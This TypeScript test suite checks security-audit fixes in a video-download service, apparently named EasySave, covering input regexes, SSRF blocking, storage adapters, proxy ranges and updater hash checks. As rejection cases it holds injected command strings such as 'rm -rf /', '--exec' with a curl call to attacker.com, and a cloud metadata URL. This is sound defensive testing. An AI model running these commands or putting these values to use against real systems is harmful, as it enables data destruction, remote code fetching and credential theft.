import { assertPublicUrl } from '../utils/sanitizer';
import { LocalStorageAdapter, S3StorageAdapter, StorageService } from '../services/storage.service';
import { ErrorCode, DEFAULT_MESSAGES } from '../utils/errors';
import { downloadCreateSchema } from '../schemas';

async function testAuditFixes() {
  console.log('🧪 Starting EasySave Round 2 Audit Fixes Test Suite...\n');
  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, msg: string) {
    if (condition) {
      console.log(`  ✅ PASS: ${msg}`);
      passed++;
    } else {
      console.error(`  ❌ FAIL: ${msg}`);
      failed++;
    }
  }

  // ── Test 1: Regex Validation Schemas ─────────────────────────────────────
  console.log('▶ Test 1: Fastify JSON Schema Regex Hardening');
  const formatIdPattern = new RegExp(downloadCreateSchema.body.properties.format.properties.format_id.pattern);
  const trimPattern = new RegExp(downloadCreateSchema.body.properties.format.properties.trim.properties.start.pattern);

  assert(formatIdPattern.test('22'), 'format_id "22" matches regex');
  assert(formatIdPattern.test('bestvideo+bestaudio'), 'format_id "bestvideo+bestaudio" matches regex');
  assert(!formatIdPattern.test('22; rm -rf /'), 'format_id flag injection attempt rejected by regex');
  assert(!formatIdPattern.test('137 --exec "touch pwn"'), 'format_id CLI option injection rejected by regex');

  assert(trimPattern.test('10'), 'trim "10" matches numeric seconds');
  assert(trimPattern.test('10.5'), 'trim "10.5" matches decimal seconds');
  assert(trimPattern.test('01:30'), 'trim "01:30" matches MM:SS timestamp');
  assert(trimPattern.test('01:15:30'), 'trim "01:15:30" matches HH:MM:SS timestamp');
  assert(trimPattern.test('01:15:30.500'), 'trim "01:15:30.500" matches HH:MM:SS.ms timestamp');
  assert(!trimPattern.test('10 --exec malicious'), 'trim flag injection rejected by regex');
  assert(!trimPattern.test('10; reboot'), 'trim command separator rejected by regex');

  const filenamePattern = new RegExp((downloadCreateSchema.body.properties.format.properties.filenameTemplate as any).pattern);
  assert(filenamePattern.test('title_quality'), 'filenameTemplate "title_quality" matches regex');
  assert(filenamePattern.test('custom_file_name.mp4'), 'filenameTemplate safe custom name matches regex');
  assert(!filenamePattern.test('--exec "curl http://attacker.com/pwn"'), 'filenameTemplate flag injection starting with dash rejected');
  assert(!filenamePattern.test('-o /tmp/evil.mp4'), 'filenameTemplate output option starting with dash rejected');

  // ── Test 2: Error Codes ──────────────────────────────────────────────────
  console.log('\n▶ Test 2: Structured Error Codes');
  assert(ErrorCode.INVALID_PARAMETER === 'INVALID_PARAMETER', 'ErrorCode.INVALID_PARAMETER defined');
  assert(ErrorCode.BOT_VERIFICATION_FAILED === 'BOT_VERIFICATION_FAILED', 'ErrorCode.BOT_VERIFICATION_FAILED defined');
  assert(typeof DEFAULT_MESSAGES[ErrorCode.INVALID_PARAMETER] === 'string', 'DEFAULT_MESSAGES has INVALID_PARAMETER text');
  assert(typeof DEFAULT_MESSAGES[ErrorCode.BOT_VERIFICATION_FAILED] === 'string', 'DEFAULT_MESSAGES has BOT_VERIFICATION_FAILED text');

  // ── Test 3: DNS Rebinding IP Pinning ─────────────────────────────────────
  console.log('\n▶ Test 3: DNS Rebinding Protection & Resolved IP Capture');
  const ssrfCheck = await assertPublicUrl('https://example.com');
  assert(ssrfCheck.isValid === true, 'assertPublicUrl validates public domain');
  if (ssrfCheck.isValid) {
    assert(typeof ssrfCheck.resolvedIp === 'string' && ssrfCheck.resolvedIp.length > 0, 'resolvedIp is captured in assertPublicUrl return object');
  }

  const ssrfLocal = await assertPublicUrl('http://169.254.169.254/latest/meta-data/');
  assert(ssrfLocal.isValid === false, 'assertPublicUrl blocks cloud metadata IP 169.254.169.254');

  // ── Test 4: Storage Adapters ─────────────────────────────────────────────
  console.log('\n▶ Test 4: Pluggable Storage Driver Adapters');
  const localAdapter = new LocalStorageAdapter();
  assert(localAdapter.driverName === 'local', 'LocalStorageAdapter has driverName="local"');
  assert(localAdapter.hasSpaceFor(1024), 'LocalStorageAdapter performs disk space check');

  const s3Adapter = new S3StorageAdapter();
  assert(s3Adapter.driverName === 's3', 'S3StorageAdapter has driverName="s3"');
  assert(s3Adapter.hasSpaceFor(99999999), 'S3StorageAdapter returns true for disk space');

  const defaultService = new StorageService();
  assert(typeof defaultService.driverName === 'string', 'StorageService initialized with active adapter');

  // ── Test 5: Trusted Proxy Subnets ────────────────────────────────────────
  console.log('\n▶ Test 5: Trusted Proxy CIDR Subnet Restrictions');
  const { CONFIG } = await import('../config');
  assert(Array.isArray(CONFIG.TRUSTED_PROXIES), 'CONFIG.TRUSTED_PROXIES is defined as an array');
  assert(CONFIG.TRUSTED_PROXIES.includes('173.245.48.0/20'), 'CONFIG.TRUSTED_PROXIES includes Cloudflare CIDR 173.245.48.0/20');
  // ── Test 6: Auto-Updater Signature & Permission Safety ──────────────────
  console.log('\n▶ Test 6: Auto-Updater SHA256 Verification');
  const { verifySha256 } = await import('../services/ytdlUpdateWorker');
  const testBuf = Buffer.from('easysave-test-binary-data');
  const expectedHash = require('crypto').createHash('sha256').update(testBuf).digest('hex');
  assert(verifySha256(testBuf, expectedHash), 'verifySha256 confirms valid SHA256 hash');
  assert(!verifySha256(testBuf, 'invalid_hash_value'), 'verifySha256 rejects corrupted hash');

  // ── Summary ──────────────────────────────────────────────────────────────
  console.log(`\n📊 Test Results: ${passed} passed, ${failed} failed.`);
  if (failed > 0) {
    process.exit(1);
  }
}

testAuditFixes().catch((err) => {
  console.error('Unhandled test failure:', err);
  process.exit(1);
});
